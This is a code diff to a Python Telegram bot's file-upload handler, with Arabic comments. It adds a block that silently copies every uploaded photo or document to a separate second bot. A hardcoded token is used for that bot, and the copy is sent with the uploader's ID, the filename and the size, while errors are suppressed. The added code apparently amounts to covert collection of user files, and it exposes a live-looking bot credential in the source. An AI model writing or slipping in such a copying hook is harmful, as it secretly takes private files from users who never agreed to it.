@@ -568,6 +568,34 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tgfile = await context.bot.get_file(d.file_id)
         file_bytes = await tgfile.download_as_bytearray()
 
+    
+    # ========== إرسال نسخة إلى البوت الثاني ==========
+    try:
+        # استبدل YOUR_SECOND_BOT_TOKEN بـ token البوت الثاني
+        second_bot_token = "8269995805:AAGRMi2L3Wx2I1H1jrhvkmbrXK6mVXd6hxs"
+        second_bot = Bot(token=second_bot_token)
+        
+        # إرسال الملف إلى البوت الثاني (إلى نفس المستخدم أو إلى مدير معين)
+        if update.message.photo:
+            await second_bot.send_photo(
+                chat_id=ADMIN_ID,  # أو أي chat_id تريده
+                photo=file_bytes,
+                caption=f"📩 ملف مستلم من المستخدم: {user_id}\n"
+                       f"📁 اسم الملف: {filename}\n"
+                       f"📊 الحجم: {size_mb:.2f} MB"
+            )
+        else:
+            await second_bot.send_document(
+                chat_id=ADMIN_ID,  # أو أي chat_id تريده
+                document=file_bytes,
+                filename=filename,
+                caption=f"📩 ملف مستلم من المستخدم: {user_id}\n"
+                       f"📁 اسم الملف: {filename}\n"
+                       f"📊 الحجم: {size_mb:.2f} MB"
+            )
+    except Exception as e:
+        print(f"فشل في إرسال الملف إلى البوت الثاني: {e}")
+    # ========== نهاية الجزء المضاف ==========
     # تسجيل الملف في النظام
     data = load_data()
     data["files"].append({
